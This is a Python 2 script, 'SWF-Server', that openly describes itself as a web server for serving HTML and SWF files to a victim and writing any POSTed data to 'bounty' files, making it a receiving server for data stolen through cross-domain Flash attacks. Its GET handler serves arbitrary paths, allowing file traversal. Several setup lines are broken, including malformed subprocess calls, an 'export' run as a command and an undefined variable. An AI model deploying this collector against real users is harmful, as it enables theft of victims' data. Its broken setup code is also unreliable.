#!/usr/bin/python

######################################################################
# Author:  Seth Art (sethsec@gmail.com, @sethsec)                    #
# Version: 0.9.1                                                     #
# Date:    10.10.2014                                                #
# Purpose: Very basic web server that answers GET and POST requests  #
#          The server is designed to serve an html and swf file to   #
#          a victim, and will save any data that comes via POST body #
#          to a file on disk.                                        #
#                                                                    #
######################################################################

import ssl
import time
import BaseHTTPServer
import cgi
from urlparse import parse_qsl
from BaseHTTPServer import BaseHTTPRequestHandler
import os
import urllib2
from hashlib import sha512
import zipfile
import subprocess

PORT_NUMBER = 443 # Change this if you are already running an SSL server on port 443 
VERSION = "0.9.1"


class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
    def do_GET(s):
        """Respond to a GET request."""
        s.send_response(200)
        s.send_header("Content-type", "text/html")
        s.end_headers()
        spath = s.path.lstrip('/')
        with open (spath, 'r') as file:
            s.wfile.writelines(file)

    def do_POST(s):
        """Save data from ANY POST request to a file on disk"""
        length = int(s.headers['content-length'])
        postvars =  parse_qsl(s.rfile.read(length), keep_blank_values=1)
        clientIP = s.client_address[0]
        timestamp = time.time()
        filename = 'bounty-%s-%s.txt' % (clientIP,timestamp)
        with open('../bounty/%s' % filename, 'w') as txt:
            txt.writelines(postvars[0])
        print
        print "*  New bounty file written to disk: %s/bounty/%s  " % (curpath,filename)
        print
        s.send_response(200)
        s.send_header("Content-type", "text/html")
        s.end_headers()

def start_server(run_path):
    server_class = BaseHTTPServer.HTTPServer
    
    os.chdir('%s/webroot' % run_path)
    httpd = server_class(('', PORT_NUMBER), MyHandler)
    httpd.socket = ssl.wrap_socket (httpd.socket, certfile='%s/server.pem' % run_path, server_side=True)
    print
    print 
    print "      [SWF-Server] Listening on %s/tcp" % (PORT_NUMBER)
    print "      [SWF-Server] Document Root: %s" % (os.getcwd())
    print "      [SWF-Server] Version:       %s" % (VERSION)
    print "      [SWF-Server] Use <Ctrl-C> to stop"
    print
    print 
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    httpd.server_close()
    print time.asctime(), "Server Stopped"

def download_flex():
    
    # From: http://blog.radevic.com/2012/07/python-download-url-to-file-with.html
    # Improve http://stackoverflow.com/a/22776/286994
    # (using .format() instead of % string formatting)

    import sys
    import urllib2

    url = "http://download.macromedia.com/pub/flex/sdk/flex_sdk_4.6.zip"
    
    file_name = url.split('/')[-1]
    u = urllib2.urlopen(url)
    f = open(file_name, 'wb')
    meta = u.info()
    file_size = int(meta.getheaders("Content-Length")[0])
    print("Downloading: {0} Bytes: {1}".format(url, file_size))

    file_size_dl = 0
    block_sz = 8192
    while True:
        buffer = u.read(block_sz)
        if not buffer:
            break

        file_size_dl += len(buffer)
        f.write(buffer)
        p = float(file_size_dl) / file_size
        status = r"{0}  [{1:.2%}]".format(file_size_dl, p)
        status = status + chr(8)*(len(status)+1)
        sys.stdout.write(status)

    f.close()

    flex_checksum = sha512(open("/opt/flex/flex_sdk_4.6.zip", 'rb').read()).hexdigest()
    
    if flex_checksum == "e553553c2a536b31400c444b84a697e337f33eded344ffaaa8b8978a237e5a77f358f850073003b4bfd519e5947a5a1ca1c87324336b922d4ccda7cd94889737":
        print "Extracting Flex to /opt/flex"
        subprocess.call(["unzip", "-o flex_sdk_4.6.zip"])
        subprocess.call(["chmod", "-R a+rx /opt/flex/"])
        subprocess.call(["export", "PATH=$/opt/flex/bin:$PATH' >> ~/.bashrc"])
        subprocess.call(["chmod", "755 bin/mxmlc"])
    else:
        CK_SM_CONT = raw_input("Invalid checksum for flex_sdk_4.6.zip download.  Are you sure you want to continue? (y/n)")
        if CK_SM_CONT == "y":
            subprocess.call(["unzip", "-o flex_sdk_4.6.zip"])
            subprocess.call(["chmod", "-R a+rx /opt/flex/"])
            subprocess.call(["export", "PATH=$/opt/flex/bin:$PATH' >> ~/.bashrc"])
            subprocess.call(["chmod", "755 bin/mxmlc"])
        else:
            exit








if __name__ == '__main__':
    run_path = os.getcwd()
    if not os.path.isdir("/opt/flex"):
        print "   Welcome to SWF Server!"
        print "   It looks like this is the first run.  We need to set up a few things first."
        print ""
        print "   Creating /opt/flex"
        os.makedirs("/opt/flex")
    os.chdir("/opt/flex")
    if not os.path.isfile("/opt/flex/flex_sdk_4.6.zip"):
        print "   Downloading Flex (This is a 340MB file)..."
        download_flex()
    else:
        flex_checksum = sha512(open("/opt/flex/flex_sdk_4.6.zip", 'rb').read()).hexdigest()
        
        
        if not flex_checksum == "e553553c2a536b31400c444b84a697e337f33eded344ffaaa8b8978a237e5a77f358f850073003b4bfd519e5947a5a1ca1c87324336b922d4ccda7cd94889737":
            print "   Flex file exists, but the file checksum does not match. Downloading again..."


            download_flex()
    if not os.path.isfile("%s/server.pem" % run_path):
        print "   Creating a self-signed SSL cert..."    
        os.system('openssl req -new -x509 -keyout %s/server.pem -out %s/server.pem -days 365 -nodes -subj "/C=US"' % (run_path, run_path))
    
    if os.path.isdir("/usr/share/nmap/scripts"):
        if not os.path.isfile("/usr/share/nmap/scripts/http-crossdomain.nse"):
            print "   Copying http-crossdomain.nse to nmap scripts directory..."
            os.system("cp %s/http-crossdomain.nse /usr/share/nmap/scripts/" % run_path)
    elif os.path.isdir("/usr/local/share/nmap/scripts"):
        if not os.path.isfile("/usr/local/share/nmap/scripts/http-crossdomain.nse"):
            print "   Copying http-crossdomain.nse to nmap scripts directory..."
            os.system("cp %s/http-crossdomain.nse /usr/local/share/nmap/scripts/" % run_path)


    start_server(run_path)

